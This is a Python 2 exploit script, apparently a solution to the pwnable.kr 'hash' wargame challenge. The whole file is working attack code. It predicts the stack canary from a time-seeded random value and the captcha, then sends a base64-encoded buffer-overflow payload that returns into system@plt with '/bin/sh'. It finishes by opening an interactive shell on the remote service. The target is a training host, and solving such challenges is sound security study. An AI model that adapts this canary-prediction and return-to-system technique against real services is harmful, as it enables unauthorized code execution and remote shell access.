#!/usr/bin/env python
 
import telnetlib
import socket
import struct
import ctypes
import crand
 
g_buf = 0x804b3b1
system_plt = 0x8048880
 
# remote time difference seems to be ~10 seconds
diff = 8
 
# local difference
#diff = 0
 
append = "\x00/bin/sh"
 
def p(v):
  return struct.pack("<I", v)
 
def u(v):
  return struct.unpack("<I", v)[0]
 
def rtil(s, mesg):
  buf = ""
  while True:
    c = s.recv(1)
    if c == "":
      break
    buf += c
    if  mesg in buf:
      break
 
  return buf
 
while True:
  #s = socket.create_connection(("localhost", 4000))
  s = socket.create_connection(("pwnable.kr", 9002))
  hashed = ctypes.c_uint32(crand.hash(diff)).value
 
  print "hashed %x" % hashed
 
  rtil(s," : ")
  captcha = s.recv(64)
  captcha_c = ctypes.c_uint32(int(captcha)).value
  print "captcha %x" % captcha_c
  cook = ctypes.c_uint32((captcha_c - hashed)).value
  print "predicted cookie: %x" % cook
 
  s.send(captcha.rstrip() + "\n")
 
  payload = "".rjust(0x200, "A")
  payload += p(cook)
  payload += "B" * 12
  payload += p(system_plt)
  payload += p(0xdeadbeef)
  payload += p(g_buf)
 
  print payload.encode('base64')
 
  s.send(payload.encode('base64').replace("\n", "") + append + "\n")
 
  print "*** interact ***\n\n"
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()
